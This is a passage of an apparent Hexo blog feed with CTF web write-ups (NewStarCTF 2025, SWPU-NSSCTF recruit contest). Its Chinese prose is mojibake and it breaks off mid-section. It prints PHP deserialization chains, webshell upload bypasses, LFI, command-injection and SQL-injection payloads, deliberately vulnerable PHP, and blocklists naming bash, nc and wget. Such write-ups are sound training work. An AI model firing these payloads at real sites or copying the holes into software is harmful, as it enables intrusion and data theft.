class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">startPoint</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$direction</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Treasure</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$door</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$chest</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SaySomething</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sth</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">endPoint</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// startPoint#__wakeup()==&gt;SaySomething#__invoke()==&gt;Treasure#__toString()==&gt;Treasure#__get()==&gt;endPoint#__call()</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">startPoint</span>();<br><span class="hljs-variable">$a</span>-&gt;direction = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SaySomething</span>();<br><span class="hljs-variable">$a</span>-&gt;direction-&gt;sth = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Treasure</span>();<br><span class="hljs-variable">$a</span>-&gt;direction-&gt;sth-&gt;chest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Treasure</span>();<br><span class="hljs-variable">$a</span>-&gt;direction-&gt;sth-&gt;chest-&gt;door = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">endPoint</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>å½“phpç‰ˆæœ¬å°äº8æ—¶ï¼Œgetè¯·æ±‚çš„å‚æ•°åå«æœ‰<code>.</code>ï¼Œä¼šè¢«è½¬ä¸º<code>_</code>ï¼Œä½†æ˜¯å¦‚æœå‚æ•°åä¸­å«æœ‰<code>[</code>ï¼Œ<code>[</code>è¿™ä¸ªå°†ç›´æ¥è¢«è½¬ä¸º<code>_</code>ä¸”åé¢çš„<code>.</code>å°†ä¸ä¼šè¢«è½¬ä¸º<code>_</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">payload: url/?ma[ze.<span class="hljs-attribute">path</span>=TzoxMDoic3RhcnRQb2ludCI6MTp7czo5OiJkaXJlY3Rpb24iO086MTI6IlNheVNvbWV0aGluZyI6MTp7czozOiJzdGgiO086ODoiVHJlYXN1cmUiOjI6e3M6NDoiZG9vciI7TjtzOjU6ImNoZXN0IjtPOjg6IlRyZWFzdXJlIjoyOntzOjQ6ImRvb3IiO086ODoiZW5kUG9pbnQiOjE6e3M6MTQ6IgBlbmRQb2ludABwYXRoIjtzOjU3OiJwaHA6Ly9maWx0ZXIvcmVhZD1jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9ZmxhZy5waHAiO31zOjU6ImNoZXN0IjtOO319fX0=<br></code></pre></td></tr></table></figure><h3 id="å°Eçš„ç•™è¨€æ¿"><a href="#å°Eçš„ç•™è¨€æ¿" class="headerlink" title="å°Eçš„ç•™è¨€æ¿"></a>å°Eçš„ç•™è¨€æ¿</h3><h3 id="æ­¦åŠŸç§˜ç±"><a href="#æ­¦åŠŸç§˜ç±" class="headerlink" title="æ­¦åŠŸç§˜ç±"></a>æ­¦åŠŸç§˜ç±</h3><p>æµè§ˆå™¨ç›´æ¥æœdcrcmsæ¼æ´ï¼Œå‘ç°æœ‰ä¸€ä¸ª<a href="https://blog.csdn.net/qq_53079406/article/details/127238674">ç®¡ç†å‘˜åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ å¯¼è‡´getshellæ¼æ´</a></p><p>ç‚¹å‡»æ–°é—»ä¸­å¿ƒè¿›å…¥åˆ°äº†åå°ç™»å½•ç•Œé¢ï¼Œctrl+ué¡µé¢æºç ä¸­æœ‰æç¤ºå¼±å£ä»¤ï¼Œ<code>admin/admin</code>ç™»å½•æˆåŠŸ</p><p>å…ˆæ·»åŠ ä¸€ä¸ªæ–°é—»åˆ†ç±»ï¼Œç„¶åæ·»åŠ æ–°é—»ï¼Œåœ¨ä¸Šä¼ å›¾ç‰‡å¤„ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒbpæŠ“åŒ…å°†åç¼€æ”¹ä¸ºphp</p><p>ç„¶å<code>ç³»ç»Ÿç®¡ç†-&gt;æ–‡ä»¶ç®¡ç†-&gt;uploads-&gt;news-&gt;2025_10_28</code>ä¸­å‘ç°ä¸Šä¼ çš„phpæ–‡ä»¶ï¼Œå¾—åˆ°shellçš„ä¿å­˜è·¯å¾„&#x2F;uploads&#x2F;news&#x2F;2025_10_28&#x2F;</p><p>æ‰“å¼€ï¼Œç›´æ¥rce</p><p><img src="/../images/2025NewStarCTF/wgmj.png"></p>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025SWPU-NSSCTFç§‹å­£æ‹›æ–°å…¥é—¨è®­ç»ƒèµ›</title>
    <link href="/2025/10/08/2025SWPU-NSSCTF%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/"/>
    <url>/2025/10/08/2025SWPU-NSSCTF%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="gift-f12"><a href="#gift-f12" class="headerlink" title="gift_f12"></a>gift_f12</h2><p>ç›´æ¥f12ï¼Œæ£€ç´¢flag</p><p><img src="/../images/2025SWPU-NSSCTF%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/gift.png"></p><h2 id="Do-you-know-http"><a href="#Do-you-know-http" class="headerlink" title="Do_you_know_http"></a>Do_you_know_http</h2><p>å°†uaå¤´æ”¹ä¸ºWLLMï¼Œå¹¶åŠ ä¸€ä¸ªxffå¤´å³å¯</p><p><img src="/../images/2025SWPU-NSSCTF%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/http.png"></p><h2 id="WebFTP"><a href="#WebFTP" class="headerlink" title="WebFTP"></a>WebFTP</h2><p>é¦–å…ˆæ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œå°è¯•çˆ†ç ´ï¼Œå¹¶æœªæˆåŠŸ</p><p>ç”¨dirsearchæ‰«ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°<code>/.git</code>ç›®å½•ï¼Œå°è¯•ç”¨githackeræ‹‰åˆ°æœ¬åœ°ï¼Œä¹Ÿæ²¡æœ‰æˆåŠŸ</p><p>æœ€åphpinfo.phpä¸­æ‰¾åˆ°flag</p><p><img src="/../images/2025SWPU-NSSCTF%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/webftp.png"></p><h2 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">payload: url/?json=&#123;<span class="hljs-string">&quot;x&quot;</span>:<span class="hljs-string">&quot;wllm&quot;</span>&#125;<br>postä¼ <span class="hljs-attribute">id</span>=wllmNB<br></code></pre></td></tr></table></figure><h2 id="easyupload1-0"><a href="#easyupload1-0" class="headerlink" title="easyupload1.0"></a>easyupload1.0</h2><p>MIMEç±»å‹æ£€æµ‹ï¼ŒbpæŠ“åŒ…å°†<code>Content-Type</code>å­—æ®µæ”¹ä¸º<code>image/png</code>å³å¯æˆåŠŸä¸Šä¼ shellï¼Œå¹¶ä¼šè¿”å›shellçš„ä¿å­˜è·¯å¾„ï¼Œç›´æ¥rce</p><p><img src="/../images/2025SWPU-NSSCTF%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/easyupload.png"></p><h2 id="easyupload2-0"><a href="#easyupload2-0" class="headerlink" title="easyupload2.0"></a>easyupload2.0</h2><p>åç¼€è§£æç»•è¿‡ï¼Œå°†<code>.phtml</code>å½“ä½œäº†phpæ–‡ä»¶è¿›è¡Œè§£æï¼ŒæŠŠshellçš„åç¼€æ”¹ä¸º<code>.phtml</code>å³å¯ï¼Œç„¶åç›´æ¥rce</p><h2 id="easyupload3-0"><a href="#easyupload3-0" class="headerlink" title="easyupload3.0"></a>easyupload3.0</h2><p>é…ç½®æ–‡ä»¶ç»•è¿‡ï¼Œä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶ï¼Œç„¶åå†ä¸Šä¼ ä¸€ä¸ªshell.pngï¼Œæœ€årceæ‹¿flag</p><h2 id="finalrce"><a href="#finalrce" class="headerlink" title="finalrce"></a>finalrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you see anything?&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>æ‹¼æ¥ç»•è¿‡+teeå‘½ä»¤</p><p><code>tee</code>ï¼šä»æ ‡å¿—è¾“å…¥è¯»å–æ•°æ®ï¼Œå¹¶å°†å…¶å†™å…¥æ ‡å¿—è¾“å‡ºæˆ–ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ä¸­ï¼Œå¸¸ä¸å…¶å®ƒå‘½ä»¤é…åˆç®¡é“ç¬¦ä½¿ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">payload: ?url=ca\t /flllll\aaaaaaggggggg | <span class="hljs-built_in">tee</span> ly.txt<br></code></pre></td></tr></table></figure><h2 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a>PseudoProtocols</h2><p>æç¤ºâ€œCan you find out the hint.php?â€ï¼Œå¹¶å‘ç°urlä¸­æœ‰ä¸€ä¸ªå‚æ•°wllmï¼Œå°è¯•ç”¨<code>php://filter</code>ä¼ªåè®®è¯»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">paylaod: url/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php<br></code></pre></td></tr></table></figure><p><img src="/../images/2025SWPU-NSSCTF%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/PseudoProtocols.png"></p><p>è§£ç åæç¤ºâ€œgo to &#x2F;test2222222222222.phpâ€ï¼Œå¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;max_execution_time&quot;</span>, <span class="hljs-string">&quot;180&quot;</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>)) === <span class="hljs-string">&#x27;I want flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ç”¨<code>data://</code>æˆ–<code>php://input</code>ä¼ªåè®®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">payload: url<span class="hljs-regexp">/test2222222222222.php?a=data:/</span><span class="hljs-regexp">/text/</span>plain,I want flag<br></code></pre></td></tr></table></figure><h2 id="ez-ez-php"><a href="#ez-ez-php" class="headerlink" title="ez_ez_php"></a>ez_ez_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) === <span class="hljs-string">&quot;php&quot;</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Nice!!!&quot;</span>;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>    &#125; <br><br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">//flag.php </span><br></code></pre></td></tr></table></figure><p>ç›´æ¥ç”¨<code>php://filter</code>ä¼ªåè®®</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">payload: url/?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>è§£ç åæç¤ºâ€œreal_flag_is_in_â€™flagâ€™â€</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">payload: url/?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=flag<br></code></pre></td></tr></table></figure><h2 id="babyRCE"><a href="#babyRCE" class="headerlink" title="babyRCE"></a>babyRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$rce</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;rce&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$rce</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="hljs-variable">$rce</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$rce</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hhhhhhacker!!!&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>æ‹¼æ¥+ç©ºæ ¼ç»•è¿‡</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">payload:</span> url/<span class="hljs-string">?r</span>ce=ca\t<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fl?<span class="hljs-string">??</span><span class="hljs-string">??</span>?<br></code></pre></td></tr></table></figure><h2 id="å¯¼å¼¹è¿·è¸ª"><a href="#å¯¼å¼¹è¿·è¸ª" class="headerlink" title="å¯¼å¼¹è¿·è¸ª"></a>å¯¼å¼¹è¿·è¸ª</h2><p>é¢˜ç›®æç¤ºâ€œé€šè¿‡6é“å…³å¡å°±èƒ½æ‹¿åˆ°flagå“¦~â€ï¼Œåœ¨game.jsä¸­å‘ç°mLevelï¼ŒçŒœæƒ³åº”è¯¥æ˜¯ç”¨æ¥è®°å½•å½“å‰å…³å¡çš„ï¼Œç›´æ¥æ£€ç´¢mLevel</p><p><img src="/../images/2025SWPU-NSSCTF%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/taodan.png"></p><h2 id="caidao"><a href="#caidao" class="headerlink" title="caidao"></a>caidao</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">post: wllm=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>æç¤ºå‚æ•°æ˜¯wllm</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">paylaod: url/?wllm=<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> test_db.test_tb)--+<br></code></pre></td></tr></table></figure><h2 id="hardrce"><a href="#hardrce" class="headerlink" title="hardrce"></a>hardrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$wllm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>];<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;\t&#x27;</span>,<span class="hljs-string">&#x27;\r&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\+&#x27;</span>,<span class="hljs-string">&#x27;\[&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\-&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\*&#x27;</span>,<span class="hljs-string">&#x27;\?&#x27;</span>,<span class="hljs-string">&#x27;\&lt;&#x27;</span>,<span class="hljs-string">&#x27;\&gt;&#x27;</span>,<span class="hljs-string">&#x27;\=&#x27;</span>,<span class="hljs-string">&#x27;\`&#x27;</span>,];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$wllm</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;LTLTè¯´ä¸èƒ½ç”¨è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„ç¬¦å·å“¦ï¼&quot;</span>);<br>    &#125;&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="hljs-variable">$wllm</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Ra&#x27;s Al Ghulè¯´ä¸èƒ½ç”¨å­—æ¯å“¦ï¼&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$wllm</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ— å­—æ¯rceï¼ŒåŒæ—¶è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦(åŒ…æ‹¬<code>^</code>å’Œ<code>+</code>)ï¼Œä½†å¹¶æ²¡æœ‰<code>~</code>å–åç¬¦å·ï¼Œå¯ä»¥åˆ©ç”¨urlencode+å–åç»•è¿‡æ­£åˆ™</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;?php<br><br>echo urlencode(~<span class="hljs-string">&#x27;system&#x27;</span>);<br>echo <span class="hljs-string">&quot;\n&quot;</span>;<br>echo urlencode(~<span class="hljs-string">&#x27;cat /flllllaaaaaaggggggg&#x27;</span>);<br><br>?&gt;<br><br>payload: url/?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);<br></code></pre></td></tr></table></figure><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">payload: url/?wllm=-1&#x27;<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>mid(group_concat(flag),<span class="hljs-number">41</span>,<span class="hljs-number">60</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>test_db.LTLT_flag)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>flagæ˜¾ç¤ºä¸å…¨ï¼Œsubstringè¢«wafäº†ï¼Œç”¨midï¼Œæ³¨æ„ï¼šmidæœ€å¤§å›æ˜¾é•¿åº¦ä¸º20</p><h2 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h2><p>å¤šå‘½ä»¤æ‰§è¡Œ+ç©ºæ ¼ç»•è¿‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">payload: 1;<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$1</span>`<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>[]=<span class="hljs-number">1</span>&amp;b1[]=<span class="hljs-number">2</span>&amp;b2[]=<span class="hljs-number">3</span>&amp;c1=QNKCDZO&amp;c2=<span class="hljs-number">240610708</span><br></code></pre></td></tr></table></figure><h2 id="å¥‡å¦™çš„MD5"><a href="#å¥‡å¦™çš„MD5" class="headerlink" title="å¥‡å¦™çš„MD5"></a>å¥‡å¦™çš„MD5</h2><p>sta4t.phpâ€”â€”æäº¤<code>ffifdyop</code></p><p>æ¥ä¸‹æ¥ä¸¤å…³ç”¨æ•°ç»„ç»•è¿‡å³å¯</p><h2 id="é«˜äº®ä¸»é¢˜-åˆ’æ‰-èƒŒæ™¯æŸ¥çœ‹å™¨"><a href="#é«˜äº®ä¸»é¢˜-åˆ’æ‰-èƒŒæ™¯æŸ¥çœ‹å™¨" class="headerlink" title="é«˜äº®ä¸»é¢˜(åˆ’æ‰)èƒŒæ™¯æŸ¥çœ‹å™¨"></a>é«˜äº®ä¸»é¢˜(åˆ’æ‰)èƒŒæ™¯æŸ¥çœ‹å™¨</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 